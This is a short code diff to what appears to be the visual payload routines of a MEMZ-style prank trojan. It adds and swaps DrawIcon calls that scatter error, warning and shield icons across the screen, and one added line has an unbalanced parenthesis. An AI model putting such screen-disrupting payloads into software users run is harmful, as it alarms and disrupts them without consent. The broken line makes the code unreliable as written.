@@ -192,7 +192,8 @@ int payloadPIP(PAYLOADFUNC) {
 
 	out: return 200.0 / (times / 5.0 + 1) + 4;
 }
-////Credits and thanks to JLee79
+////Credits and thanks to JLee79 and Michael Petrotta
+///https://stackoverflow.com/questions/2798922/storage-location-of-yellow-blue-shield-icon
 ///https://chowdera.com/2021/04/20210430135939765k.html
 int payloadDrawErrors(PAYLOADFUNC) {
 	PAYLOADHEAD
@@ -208,12 +209,14 @@ int payloadDrawErrors(PAYLOADFUNC) {
 
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));
 	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_INFORMATION));
-
+	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_APPLICATION));
+	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_WARNING)));
+        DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_HAND));
 	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
 		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
 		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_ERROR));
 		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_APPLICATION));
-		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_WINLOGO));
+		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_SHIELD));
 		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_HAND));
 		DrawIcon(hdc, random() % scrw, random() % scrh, LoadIcon(NULL, IDI_QUESTION));
 		
